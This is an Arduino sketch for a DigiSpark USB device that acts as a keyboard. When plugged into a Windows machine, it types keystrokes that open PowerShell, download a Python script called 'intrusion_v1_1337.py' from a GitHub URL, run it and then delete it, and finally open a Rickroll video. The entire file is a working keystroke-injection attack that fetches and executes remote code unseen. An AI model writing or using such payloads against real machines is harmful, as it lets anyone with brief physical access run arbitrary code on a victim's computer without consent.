#include "DigiKeyboard.h"

#define LED_BUILTIN 1

bool run_once;

void setup() {
  run_once = true;
  pinMode(LED_BUILTIN, OUTPUT);
}

void loop() {
  while (run_once)
  {
    // this is generally not necessary but with some older systems it seems to
    // prevent missing the first character after a delay:
    DigiKeyboard.sendKeyStroke(0);

    // WIN+R 
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("powershell");

    DigiKeyboard.delay(1000);
    DigiKeyboard.print("Invoke-WebRequest ");
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("https://raw.githubusercontent.com/peverett/DigiSparkMrRobot/master/intrusion_v1_1337.py ");
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("-OutFile intrusion_v1_1337.py");
 
    DigiKeyboard.println("python intrusion_v1_1337.py");
    DigiKeyboard.delay(15000);
    DigiKeyboard.println("rm intrusion_v1_1337.py");
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("start microsoft-edge:https://youtu.be/oHg5SJYRHA0");
    DigiKeyboard.println("exit");
    
    run_once = false;
  }  

  digitalWrite(LED_BUILTIN, HIGH);   // turn the LED on (HIGH is the voltage level)
  delay(500);                       // wait for a second
  digitalWrite(LED_BUILTIN, LOW);    // turn the LED off by making the voltage LOW
  delay(500);                       // wait for a second
}
